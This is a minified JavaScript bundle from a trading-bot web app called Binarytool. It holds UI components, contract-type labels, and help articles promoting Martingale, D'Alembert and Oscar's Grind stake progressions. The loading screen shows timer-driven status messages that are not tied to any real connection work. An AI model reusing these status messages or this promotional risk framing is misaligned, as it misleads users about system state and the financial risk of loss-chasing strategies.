                            classNameSpan: c,
                            green: u,
                            has_effect: m,
                            icon: b,
                            id: p,
                            is_disabled: f,
                            is_loading: _,
                            is_submit_success: h,
                            is_button_toggle: v,
                            is_circle: y,
                            is_circular: k,
                            is_plus: g,
                            large: T,
                            medium: E,
                            onClick: A,
                            rounded: x,
                            tabIndex: w = 0,
                            text: N,
                            wrapperClassName: S,
                            type: C,
                            primary: O,
                            primary_light: L,
                            secondary: R,
                            alternate: I,
                            transparent: D,
                            small: U,
                            tertiary: P,
                            renderText: V,
                            ...M
                        } = e, B = l()("dc-btn", {
                            "dc-btn__effect": m,
                            "dc-btn--primary": O,
                            "dc-btn--black": t,
                            "dc-btn--blue": n,
                            "dc-btn--secondary": R,
                            "dc-btn--tertiary": P,
                            "dc-btn--primary__light": L,
                            "dc-btn--primary__blue": n && O,
                            "dc-btn--tertiary__blue": n && P,
                            "dc-btn--alternate": I,
                            "dc-btn--green": u,
                            "dc-btn__rounded": x,
                            "dc-btn__large": T,
                            "dc-btn__medium": E,
                            "dc-btn__small": U,
                            "dc-btn__toggle": v,
                            "dc-btn--plus": g,
                            "dc-btn--circle": y,
                            "dc-btn--circular": k,
                            "dc-btn--transparent": D
                        }, r), F = (0, a.jsxs)("button", {
                            id: p,
                            className: B,
                            onClick: A,
                            disabled: f,
                            tabIndex: w,
                            type: h ? "button" : C || "submit",
                            ...M,
                            children: [b && (0, a.jsx)("div", {
                                className: l()("dc-btn__icon", {
                                    "dc-btn__icon--circle": y
                                }),
                                children: b
                            }), N && !(_ || h) && ("function" == typeof V && V(N[0].toUpperCase() + N.substr(1)) || (0, a.jsx)(s.Z, {
                                size: "xs",
                                weight: "bold",
                                align: "center",
                                className: l()("dc-btn__text", c),
                                children: N[0].toUpperCase() + N.substr(1)
                            })), _ && (0, a.jsx)(d, {}), h && (0, a.jsx)(o.J, {
                                icon: "IcCheckmark",
                                color: "active",
                                size: 24
                            }), g && (0, a.jsx)(o.J, {
                                icon: "IcAddBold",
                                color: "black",
                                size: 18
                            }), !N && !_ && i && (0, a.jsx)(s.Z, {
                                size: "xs",
                                weight: "bold",
                                align: "center",
                                className: l()("dc-btn__text", c),
                                children: i
                            })]
                        }), j = (0, a.jsx)("div", {
                            className: S,
                            children: F
                        });
                        return S ? j : F
                    };
                c.Group = e => {
                    let {
                        children: t,
                        className: n
                    } = e;
                    return (0, a.jsx)("div", {
                        className: l()("dc-btn__group", n),
                        children: t
                    })
                };
                let u = c
            },
            10434: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: () => b
                });
                var a = n("85893"),
                    i = n("67294"),
                    l = n("63387"),
                    o = n.n(l),
                    s = n("73935"),
                    r = n("81262"),
                    d = n("1051"),
                    c = n("76298"),
                    u = n("8015"),
                    m = n("45452");
                let b = e => {
                    var t;
                    let {
                        disableApp: n,
                        dismissable: l,
                        enableApp: b,
                        is_closed_on_cancel: p = !0,
                        is_closed_on_confirm: f = !0,
                        is_visible: _,
                        onCancel: h,
                        onClose: v,
                        onConfirm: y,
                        onEscapeButtonCancel: k,
                        ...g
                    } = e, {
                        cancel_button_text: T,
                        className: E,
                        children: A,
                        confirm_button_text: x,
                        is_loading: w,
                        is_mobile_full_width: N = !0,
                        is_content_centered: S,
                        portal_element_id: C,
                        title: O,
                        has_close_icon: L
                    } = g, R = i.useRef();
                    i.useEffect(() => {
                        _ && n && n()
                    }, [_, n]), i.useEffect(() => {
                        let e = e => {
                            "Escape" === e.key && (null == k || k())
                        };
                        return window.addEventListener("keydown", e), () => window.removeEventListener("keydown", e)
                    }, []);
                    let I = () => {
                            p && b && b(), null == h || h()
                        },
                        D = () => {
                            f && b && b(), y()
                        },
                        U = () => {
                            v ? v() : h ? I() : D()
                        };
                    (0, d.t)(R, U, () => !!l || !!(L && _ && p));
                    let P = o()("dc-dialog__content", {
                            "dc-dialog__content--centered": S
                        }),
                        V = "string" == typeof A || i.isValidElement(A) && "string" == typeof(null == A ? void 0 : null === (t = A.props) || void 0 === t ? void 0 : t.i18n_default_text),
                        M = (0, a.jsx)(r.Z, {
                            appear: !0,
                            in: _ && !w,
                            timeout: 50,
                            classNames: {
                                appear: "dc-dialog__wrapper--enter",
                                enter: "dc-dialog__wrapper--enter",
                                enterDone: "dc-dialog__wrapper--enter-done",
                                exit: "dc-dialog__wrapper--exit"
                            },
                            unmountOnExit: !0,
                            children: (0, a.jsx)("div", {
                                className: o()("dc-dialog__wrapper", E, {
                                    "dc-dialog__wrapper--has-portal": !!C
                                }),
                                children: (0, a.jsxs)("div", {
                                    className: o()("dc-dialog__dialog", {
                                        "dc-dialog__dialog--has-margin": !N
                                    }),
                                    role: "dialog",
                                    ref: R,
                                    children: [(O || L) && (0, a.jsxs)("div", {
                                        className: o()("dc-dialog__header-wrapper", {
                                            "dc-dialog__header-wrapper--end": !O
                                        }),
                                        children: [!!O && (0, a.jsx)(m.Z, {
                                            as: "h1",
                                            color: "prominent",
                                            weight: "bold",
                                            className: "dc-dialog__header--title",
                                            children: O
                                        }), L && (0, a.jsx)("div", {
                                            onClick: U,
                                            className: "dc-dialog__header--close",
                                            children: (0, a.jsx)(c.Z, {
                                                height: "20px",
                                                width: "20px",
                                                fill: "var(--text-general)",
                                                className: "icon-general-fill-path"
                                            })
                                        })]
                                    }), V ? (0, a.jsx)(m.Z, {
                                        as: "p",
                                        size: "xs",
                                        styles: {
                                            lineHeight: "1.43"
                                        },
                                        className: P,
                                        children: A
                                    }) : (0, a.jsx)("div", {
                                        className: P,
                                        children: A
                                    }), (0, a.jsxs)("div", {
                                        className: "dc-dialog__footer",
                                        children: [!!h && (0, a.jsx)(u.Z, {
                                            className: "dc-dialog__button",
                                            has_effect: !0,
                                            text: T,
                                            onClick: I,
                                            secondary: !0,
                                            large: !0
                                        }), !!x && (0, a.jsx)(u.Z, {
                                            className: "dc-dialog__button",
                                            has_effect: !0,
                                            text: x,
                                            onClick: D,
                                            primary: !0,
                                            large: !0
                                        })]
                                    })]
                                })
                            })
                        });
                    if (C) {
                        let e = document.getElementById(C);
                        if (e) return s.createPortal(M, e)
                    }
                    return M
                }
            },
            31302: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: () => o
                });
                var a = n("85893"),
                    i = n("67294");
                let l = ["Connecting to trading server...", "Fetching real-time market data...", "Initializing trade engine...", "Syncing strategies...", "Preparing smart charts...", "Almost ready to trade..."],
                    o = () => {
                        let [e, t] = (0, i.useState)(0), [n, o] = (0, i.useState)(0);
                        return (0, i.useEffect)(() => {
                            let e = setInterval(() => {
                                    t(t => t >= 100 ? (clearInterval(e), 100) : t + 1)
                                }, 60),
                                n = setInterval(() => {
                                    o(e => (e + 1) % l.length)
                                }, 500);
                            return () => {
                                clearInterval(e), clearInterval(n)
                            }
                        }, []), (0, a.jsx)("div", {
                            className: "loader-container",
                            children: (0, a.jsxs)("div", {
                                className: "loader-content",
                                children: [(0, a.jsxs)("div", {
                                    className: "binarytool-loader__logo-container",
                                    children: [(0, a.jsx)("span", {
                                        className: "binary-part",
                                        children: "BINARY"
                                    }), (0, a.jsx)("span", {
                                        className: "fx-part",
                                        children: "TOOL"
                                    })]
                                }), (0, a.jsx)("div", {
                                    className: "binarytool-loader__welcome binarytool-loader__welcome--visible",
                                    children: (0, a.jsx)("div", {
                                        className: "binarytool-loader__welcome-tagline",
                                        children: "Welcome to Binarytool, Your Trusted and Approved Deriv Third Party Application"
                                    })
                                }), (0, a.jsx)("div", {
                                    className: "comment-text",
                                    children: l[n]
                                }), (0, a.jsx)("div", {
                                    className: "progress-bar",
                                    children: (0, a.jsx)("div", {
                                        className: "progress-fill",
                                        style: {
                                            width: `${e}%`
                                        }
                                    })
                                }), (0, a.jsxs)("div", {
                                    className: "progress-text",
                                    children: [e, "%"]
                                }), (0, a.jsx)("p", {
                                    className: "footer-text",
                                    children: "\xa9 2023 Binarytool. All rights reserved."
                                })]
                            })
                        })
                    }
            },
            87537: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: () => o
                });
                var a = n("85893"),
                    i = n("67294"),
                    l = n("66175");
                let o = i.memo(e => {
                    let {
                        amount: t = 0,
                        className: n,
                        currency: o = "USD",
                        has_sign: s,
                        should_format: r = !0,
                        show_currency: d = !1
                    } = e, c = "";
                    Number(t) && (0 > Number(t) || s) && (c = Number(t) > 0 ? "+" : "-");
                    let u = s || r ? Math.abs(Number(t)) : t,
                        m = r ? (0, l.lby)(o, u, !0, 0, 0) : u;
                    return (0, a.jsxs)(i.Fragment, {
                        children: [(0, a.jsx)("span", {
                            children: s && c
                        }), (0, a.jsxs)("span", {
                            "data-testid": "dt_span",
                            className: n,
                            children: [m, " ", d && (0, l.O$T)(o)]
                        })]
                    })
                })
            },
            31865: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: () => o
                });
                var a = n("85893");
                n("67294");
                var i = n("339"),
                    l = n("48059");
                let o = e => {
                    let {
                        href: t,
                        is_document: n,
                        is_eu_url: o = !1,
                        children: s = null,
                        ...r
                    } = e;
                    return (0, a.jsx)("a", {
                        href: ((0, i.SM)((0, l.Jb)()), (0, i.RK)(t, n, o)),
                        rel: "noopener noreferrer",
                        target: "_blank",
                        ...r,
                        children: s
                    })
                }
            },
            45452: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: () => a
                });
                let a = n("29490").Z
            },
            29490: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: function() {
                        return s
                    }
                });
                var a = n(67294),
                    i = n(63387),
                    l = n.n(i),
                    o = n(66175);
                let s = e => {
                    let {
                        children: t,
                        size: n = "s",
                        color: i = "general",
                        align: s = "left",
                        weight: r = "normal",
                        lineHeight: d = "m",
                        as: c,
                        className: u,
                        styles: m,
                        ...b
                    } = e, p = {
                        "--text-size": `var(--text-size-${n})`,
                        "--text-color": `var(--text-${i})`,
                        "--text-lh": `var(--text-lh-${d})`,
                        "--text-weight": `var(--text-weight-${r})`,
                        "--text-align": `var(--text-align-${s})`
                    }, [f, _] = a.useState(p);
                    a.useEffect(() => {
                        (0, o.Qr$)(m) ? _(p): _({ ...p,
                            ...m
                        })
                    }, [n, i, d, r, s]);
                    let h = l()("dc-text", u);
                    return a.createElement(c || "span", {
                        className: h,
                        style: f,
                        ...b
                    }, t)
                }
            },
            54798: function(e, t, n) {
                "use strict";
                n.d(t, {
                    f: function() {
                        return o
                    },
                    v: function() {
                        return s
                    }
                });
                var a = n(85893),
                    i = n(67294);
                let l = (0, i.createContext)({
                        isAutoTrading: !1,
                        setIsAutoTrading: () => {},
                        stopSpeedbot: () => {}
                    }),
                    o = () => (0, i.useContext)(l),
                    s = e => {
                        let {
                            children: t
                        } = e, [n, o] = (0, i.useState)(!1);
                        return (0, a.jsx)(l.Provider, {
                            value: {
                                isAutoTrading: n,
                                setIsAutoTrading: o,
                                stopSpeedbot: () => {
                                    o(!1)
                                }
                            },
                            children: t
                        })
                    }
            },
            24335: function(e, t, n) {
                "use strict";
                n.d(t, {
                    FK: function() {
                        return o
                    },
                    R5: function() {
                        return s
                    },
                    ve: function() {
                        return i
                    },
                    xc: function() {
                        return l
                    },
                    yj: function() {
                        return a
                    }
                });
                let a = Object.freeze({
                        WORKSPACE: "Workspace",
                        CHART: "Chart"
                    }),
                    i = Object.freeze({
                        RANDOMBOTS: 0,
                        DASHBOARD: 1,
                        BOT_BUILDER: 2,
                        FREEBOTS: 3,
                        DTRADER: 4,
                        ANALYSISTOOL: 5,
                        SIGNAL: 6,
                        CHART: 7,
                        COPYTRADING: 8
                    }),
                    l = 10,
                    o = ["id-1", "id-2", "id-3", "id-4", "id-5", "id-6", "id-7", "id-8", "id-9", "id-10"],
                    s = 500
            },
            80177: function(e, t, n) {
                "use strict";
                n.d(t, {
                    K: function() {
                        return a
                    }
                });
                let a = Object.freeze({
                    NOT_RUNNING: 0,
                    STARTING: 1,
                    RUNNING: 2,
                    PURCHASE_SENT: 3,
                    PURCHASE_RECEIVED: 4,
                    IS_STOPPING: 5,
                    CONTRACT_CLOSED: 6
                })
            },
            88817: function(e, t, n) {
                "use strict";
                n.d(t, {
                    h8: function() {
                        return s
                    },
                    sl: function() {
                        return r
                    }
                });
                var a = n(66175),
                    i = n(48059);
                let l = e => ({
                        ACCU: {
                            name: (0, i.NC)("Accumulators"),
                            position: "top"
                        },
                        ASIANU: {
                            name: (0, i.NC)("Asian Up"),
                            position: "top"
                        },
                        ASIAND: {
                            name: (0, i.NC)("Asian Down"),
                            position: "bottom"
                        },
                        CALL: {
                            name: e ? (0, i.NC)("Higher") : (0, i.NC)("Rise"),
                            position: "top"
                        },
                        PUT: {
                            name: e ? (0, i.NC)("Lower") : (0, i.NC)("Fall"),
                            position: "bottom"
                        },
                        CALLE: {
                            name: (0, i.NC)("Rise"),
                            position: "top"
                        },
                        PUTE: {
                            name: (0, i.NC)("Fall"),
                            position: "bottom"
                        },
                        CALLSPREAD: {
                            name: (0, i.NC)("Spread Up"),
                            position: "top"
                        },
                        PUTSPREAD: {
                            name: (0, i.NC)("Spread Down"),
                            position: "bottom"
                        },
                        DIGITMATCH: {
                            name: (0, i.NC)("Matches"),
                            position: "top"
                        },
                        DIGITDIFF: {
                            name: (0, i.NC)("Differs"),
                            position: "bottom"
                        },
                        DIGITEVEN: {
                            name: (0, i.NC)("Even"),
                            position: "top"
                        },
                        DIGITODD: {
                            name: (0, i.NC)("Odd"),
                            position: "bottom"
                        },
                        DIGITOVER: {
                            name: (0, i.NC)("Over"),
                            position: "top"
                        },
                        DIGITUNDER: {
                            name: (0, i.NC)("Under"),
                            position: "bottom"
                        },
                        EXPIRYMISS: {
                            name: (0, i.NC)("Ends Outside"),
                            position: "top"
                        },
                        EXPIRYRANGE: {
                            name: (0, i.NC)("Ends Between"),
                            position: "bottom"
                        },
                        LBFLOATCALL: {
                            name: (0, i.NC)("Close-to-Low"),
                            position: "top"
                        },
                        LBFLOATPUT: {
                            name: (0, i.NC)("High-to-Close"),
                            position: "top"
                        },
                        LBHIGHLOW: {
                            name: (0, i.NC)("High-to-Low"),
                            position: "top"
                        },
                        MULTUP: {
                            name: (0, i.NC)("Up"),
                            position: "top"
                        },
                        MULTDOWN: {
                            name: (0, i.NC)("Down"),
                            position: "bottom"
                        },
                        ONETOUCH: {
                            name: (0, i.NC)("Touch"),
                            position: "top"
                        },
                        NOTOUCH: {
                            name: (0, i.NC)("No Touch"),
                            position: "bottom"
                        },
                        RANGE: {
                            name: (0, i.NC)("Stays Between"),
                            position: "top"
                        },
                        UPORDOWN: {
                            name: (0, i.NC)("Goes Outside"),
                            position: "bottom"
                        },
                        RESETCALL: {
                            name: (0, i.NC)("Reset Call"),
                            position: "top"
                        },
                        RESETPUT: {
                            name: (0, i.NC)("Reset Put"),
                            position: "bottom"
                        },
                        RUNHIGH: {
                            name: (0, i.NC)("Only Ups"),
                            position: "top"
                        },
                        RUNLOW: {
                            name: (0, i.NC)("Only Downs"),
                            position: "bottom"
                        },
                        TICKHIGH: {
                            name: (0, i.NC)("High Tick"),
                            position: "top"
                        },
                        TICKLOW: {
                            name: (0, i.NC)("Low Tick"),
                            position: "bottom"
                        }
                    }),
                    o = e => ({ ...l(e)
                    }),
                    s = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                        return o(t)[e] ? o(t)[e.toUpperCase()].name : ""
                    },
                    r = () => ({
                        has_contract_update_stop_loss: {
                            trigger: "contract_update_stop_loss"
                        },
                        has_contract_update_take_profit: {
                            trigger: "contract_update_take_profit"
                        },
                        contract_update_stop_loss: {
                            rules: [
                                ["req", {
                                    condition: e => !e.contract_update_stop_loss,
                                    message: (0, i.NC)("Please enter a stop loss amount.")
                                }],
                                ["custom", {
                                    func: (e, t, n) => {
                                        let i = (0, a.vMw)(n.contract_info);
                                        return !(i < 0 && -e > i)
                                    },
                                    message: (0, i.NC)("Please enter a stop loss amount that's higher than the current potential loss.")
                                }],
                                ["custom", {
                                    func: (e, t, n) => {
                                        var a;
                                        return e < ((null == n ? void 0 : null === (a = n.contract_info) || void 0 === a ? void 0 : a.buy_price) || 0) + 1
                                    },
                                    message: (0, i.NC)("Invalid stop loss. Stop loss cannot be more than stake.")
                                }]
                            ]
                        },
                        contract_update_take_profit: {
                            rules: [
                                ["req", {
                                    condition: e => !e.contract_update_take_profit,
                                    message: (0, i.NC)("Please enter a take profit amount.")
                                }],
                                ["custom", {
                                    func: (e, t, n) => {
                                        let i = (0, a.vMw)(n.contract_info);
                                        return !(i > 0 && +e < i)
                                    },
                                    message: (0, i.NC)("Please enter a take profit amount that's higher than the current potential profit.")
                                }]
                            ]
                        }
                    })
            },
            49985: function(e, t, n) {
                "use strict";
                n.d(t, {
                    y: function() {
                        return a
                    }
                });
                let a = Object.freeze({
                    TAB_LOCAL: "local_tab",
                    TAB_GOOGLE: "google_tab",
                    TAB_RECENT: "recent_tab"
                })
            },
            68853: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    STRATEGY_1_3_2_6: () => c,
                    MARTINGALE: () => o,
                    OSCARS_GRIND: () => s,
                    D_ALEMBERT: () => l,
                    REVERSE_D_ALEMBERT: () => r,
                    REVERSE_MARTINGALE: () => d
                });
                var a = n("21995"),
                    i = n("48059");
                let l = () => [{
                        type: "subtitle",
                        content: [(0, i.NC)("Exploring the D’Alembert strategy in Binarytools")],
                        expanded: !0,
                        no_collapsible: !1
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The D'Alembert strategy involves increasing your stake after a losing trade and reducing it after a successful trade by a predetermined number of units.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Key parameters")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("These are the trade parameters used for D’Alembert strategy in Binarytools.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Initial stake:</strong> The amount that you are willing to place as a stake to enter a trade. This is the starting point for any changes in stake depending on the dynamic of the strategy being used.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Unit:</strong> The number of units that are added in the event of a trade resulting in loss or the number of units removed in the event of a trade resulting in profit. For example, if the unit is set at 2, the stake increases or decreases by two times the initial stake of 1 USD, meaning it changes by 2 USD.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Profit threshold:</strong> The bot will stop trading if your total profit exceeds this amount.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Loss threshold:</strong> The bot will stop trading if your total loss exceeds this amount.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("An example of D’Alembert strategy")]
                    }, {
                        type: "media",
                        src: (0, a.oY)("dalembert.svg"),
                        alt: (0, i.NC)("An example of D’Alembert strategy")
                    }, {
                        type: "text",
                        content: [(0, i.NC)("1. Start with the initial stake. In this example, we’ll use 1 USD."), (0, i.NC)("2. Set your preferred unit. In this example, it is 2 units or 2 USD."), (0, i.NC)("3. If the first trade results in profit, the stake for the following trade will not reduce but remain at the initial stake. The strategy minimally trades at the initial stake of 1 USD. See A1."), (0, i.NC)("4. If the second trade results in a loss, the Binarytools will automatically increase your stake for the next trade by 2 USD. Binarytools will continue to add 2 USD to the previous round’s stake after every losing trade. See A2."), (0, i.NC)("5. If the next trades are profitable, the stake for the following trade will be reduced by 2 USD. This can be shown above where the stake of 3 USD is reduced to 1 USD. See A3.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Profit and loss thresholds")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("With Binarytools, traders can set the profit and loss thresholds to secure potential profits and limit potential losses. This means that the trading bot will automatically stop when either the profit or loss thresholds are reached. It's a form of risk management that can potentially enhance returns. For example, if a trader sets the profit threshold at 100 USD and the strategy exceeds 100 USD of profit from all trades, then the bot will stop running.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Estimating the lifespan of your trades")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The D’Alembert strategy is less risky than Martingale, but you can still determine how long your funds will last with this strategy before trading. Simply use this formula.")]
                    }, {
                        type: "media",
                        src: (0, a.oY)("dalembert_formula_1.svg"),
                        dark_src: (0, a.oY)("dalembert_formula_dark_1.svg"),
                        alt: (0, i.NC)("D’Alembert formula 1"),
                        className: "formula",
                        styles: {
                            height: "6rem"
                        }
                    }, {
                        type: "text",
                        content: [(0, i.NC)("Where:"), (0, i.NC)("R is the number of rounds a trader can sustain given a specific loss threshold."), (0, i.NC)("B is the loss threshold."), (0, i.NC)("s is the initial stake."), (0, i.NC)("f is the unit increment.")],
                        className: "no-margin"
                    }, {
                        type: "text",
                        content: [(0, i.NC)("For instance, if a trader has a loss threshold (B) of 100 USD, with an initial stake (s) of 1 USD and 2 units of increment (f), the calculation would be as follows:")],
                        className: "top-margin"
                    }, {
                        type: "media",
                        src: (0, a.oY)("dalembert_formula_2.svg"),
                        dark_src: (0, a.oY)("dalembert_formula_dark_2.svg"),
                        alt: (0, i.NC)("D’Alembert formula 2"),
                        className: "formula",
                        styles: {
                            height: "6rem"
                        }
                    }, {
                        type: "text",
                        content: [(0, i.NC)("Number of rounds (R) = 10")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("This means after 10 rounds of consecutive losses, this trader will lose 100 USD. This reaches the loss threshold of 100 USD, stopping the bot.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("This formula helps you plan your trades by considering the amount of money you have and your comfort level with risk. It involves determining your loss threshold and the initial stake you want to trade with. Then, you use this formula to calculate the number of rounds you can trade. This process provides insight into stake sizing and expectations.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Summary")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The D'Alembert system offers more balanced trading through controlled stake progression. With prudent risk management like stake limits, it can be effectively automated in Binarytools. However, traders should thoroughly assess their risk appetite, test strategies on a demo account to align with their trading style before trading with real money. This allows optimising the approach and striking a balance between potential gains and losses whilst managing risk.")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("<strong>Disclaimer:</strong>")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("Please be aware that while we may use rounded figures for illustration, a stake of a specific amount does not guarantee an exact amount in successful trades. For example, a 1 USD stake does not necessarily equate to a 1 USD profit in successful trades.")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("Trading inherently involves risks, and actual profits can fluctuate due to various factors, including market volatility and other unforeseen variables. As such, exercise caution and conduct thorough research before engaging in any trading activities.")]
                    }],
                    o = () => [{
                        type: "subtitle",
                        content: [(0, i.NC)("Exploring the Martingale strategy in Binarytools")],
                        expanded: !0,
                        no_collapsible: !1
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The Martingale strategy involves increasing your stake after each loss to recoup prior losses with a single successful trade."), (0, i.NC)("This article explores the Martingale strategy integrated into Binarytools, a versatile trading bot designed to trade assets such as forex, commodities, and derived indices. We will delve into the strategy's core parameters, its application, and provide essential takeaways for traders looking to use the bot effectively.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Key parameters")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("These are the trade parameters used in Binarytools with Martingale strategy.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Initial stake:</strong> The amount that you are willing to place as a stake to enter a trade. This is the starting point for any changes in stake depending on the dynamic of the strategy being used.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Multiplier:</strong> The multiplier used to increase your stake if you're losing a trade. The value must be greater than 1.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Profit threshold:</strong> The bot will stop trading if your total profit exceeds this amount.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Loss threshold:</strong> The bot will stop trading if your total loss exceeds this amount.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Maximum stake:</strong> The maximum amount you are willing to pay to enter a single trade. The stake for your next trade will reset to the initial stake if it exceeds this value. This is an optional risk management parameter.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("An example of Martingale strategy")]
                    }, {
                        type: "media",
                        src: (0, a.oY)("martingale.svg"),
                        alt: (0, i.NC)("An example of Martingale strategy")
                    }, {
                        type: "text",
                        content: [(0, i.NC)("1. Start with the initial stake. Let’s say 1 USD."), (0, i.NC)("2. Select your Martingale multiplier. In this example, it is 2."), (0, i.NC)("3. If the first trade ends in a loss, Binarytools will automatically double your stake for the next trade to 2 USD. Binarytools will continue to double the stake after every losing trade."), (0, i.NC)("4. If a trade ends in a profit, the stake for the following trade will be reset to the initial stake amount of 1 USD.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The idea is that successful trades may recoup previous losses. However, it is crucial to exercise caution as the risk can quickly increase with this strategy. With Binarytools, you can minimise your risk by setting a maximum stake. This is an optional risk management feature. Let’s say a maximum stake of 3 USD. If your stake for the next trade is set to exceed 3 USD, your stake will reset to the initial stake of 1 USD. If you didn't set a maximum stake, it would have increased beyond 3 USD.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Profit and loss thresholds")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("With Binarytools, traders can set the profit and loss thresholds to secure potential profits and limit potential losses. This means that the trading bot will automatically stop when either the profit or loss thresholds are reached. It's a form of risk management that can potentially enhance returns. For example, if a trader sets the profit threshold at 100 USD and the strategy exceeds 100 USD of profit from all trades, then the bot will stop running.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Estimating the lifespan of your trades")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("If you're about to start trading and haven't established a Maximum Stake as part of your risk management strategy, you can determine how long your funds will last by employing the Martingale strategy. Simply use this formula.")]
                    }, {
                        type: "media",
                        src: (0, a.oY)("martingale_formula_1.svg"),
                        dark_src: (0, a.oY)("martingale_formula_dark_1.svg"),
                        alt: (0, i.NC)("Martingale formula 1"),
                        className: "formula",
                        styles: {
                            height: "6.5rem"
                        }
                    }, {
                        type: "text",
                        content: [(0, i.NC)("Where:"), (0, i.NC)("R is the number of rounds a trader can sustain given a specific loss threshold."), (0, i.NC)("B is the loss threshold."), (0, i.NC)("s is the initial stake."), (0, i.NC)("m is the Martingale multiplier.")],
                        className: "no-margin"
                    }, {
                        type: "text",
                        content: [(0, i.NC)("For instance, if a trader has a loss threshold (B) is 1000 USD, with an initial stake (s) is 1 USD, and the Martingale multiplier (m) is 2, the calculation would be as follows:")],
                        className: "top-margin"
                    }, {
                        type: "media",
                        src: (0, a.oY)("martingale_formula_2.svg"),
                        dark_src: (0, a.oY)("martingale_formula_dark_2.svg"),
                        alt: (0, i.NC)("Martingale formula 2"),
                        className: "formula",
                        styles: {
                            height: "6.5rem"
                        }
                    }, {
                        type: "text",
                        content: [(0, i.NC)("Number of rounds, R ≈ 9.965"), (0, i.NC)("This means that after 10 rounds of consecutive losses, this trader will lose 1023 USD which exceeds the loss threshold of 1000 USD, stopping the bot."), (0, i.NC)("This formula helps you plan your trades by considering the amount of money you have and your comfort level with risk. It involves determining your loss threshold and the initial stake you want to trade with. Then, you use this formula to calculate the number of rounds you can trade. This process provides insight into stake sizing and expectations.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Summary")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The Martingale strategy in trading may offer substantial gains but also comes with significant risks. With your selected strategy, Binarytools provides automated trading with risk management measures like setting initial stake, stake size, maximum stake, profit threshold and loss threshold. It's crucial for traders to assess their risk tolerance, practice in a demo account, and understand the strategy before trading with real money.")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("<strong>Disclaimer:</strong>")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("Please be aware that while we may use rounded figures for illustration, a stake of a specific amount does not guarantee an exact amount in successful trades. For example, a 1 USD stake does not necessarily equate to a 1 USD profit in successful trades.")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("Trading inherently involves risks, and actual profits can fluctuate due to various factors, including market volatility and other unforeseen variables. As such, exercise caution and conduct thorough research before engaging in any trading activities.")]
                    }],
                    s = () => [{
                        type: "subtitle",
                        content: [(0, i.NC)("Exploring the Oscar’s Grind strategy in Binarytools")],
                        expanded: !0,
                        no_collapsible: !1
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The Oscar’s Grind strategy is designed to potentially gain a modest yet steady profit in each trading session. This strategy splits trades into sessions and has three principles.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Key parameters")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("These are the trade parameters used for Oscar’s Grind strategy in Binarytools.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Initial stake:</strong> The amount that you are willing to place as a stake to enter a trade. This is the starting point for any changes in stake depending on the dynamic of the strategy being used.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Profit threshold:</strong> The bot will stop trading if your total profit exceeds this amount.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Loss threshold:</strong> The bot will stop trading if your total loss exceeds this amount.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("An example of Oscar’s Grind strategy")]
                    }, {
                        type: "media",
                        src: (0, a.oY)("oscars_grind.png"),
                        alt: (0, i.NC)("An example of Oscar’s Grind strategy")
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Principle 1: Strategy aims to potentially make one unit of profit per session</strong>")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The table above demonstrates this principle by showing that when a successful trade occurs and meets the target of one unit of potential profit which is 1 USD in this example, the session ends. If trading continues, a new session will begin.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Principle 2: The stake only increases when a loss trade is followed by a successful trade</strong>")]
                    }, {
                        type: "text",
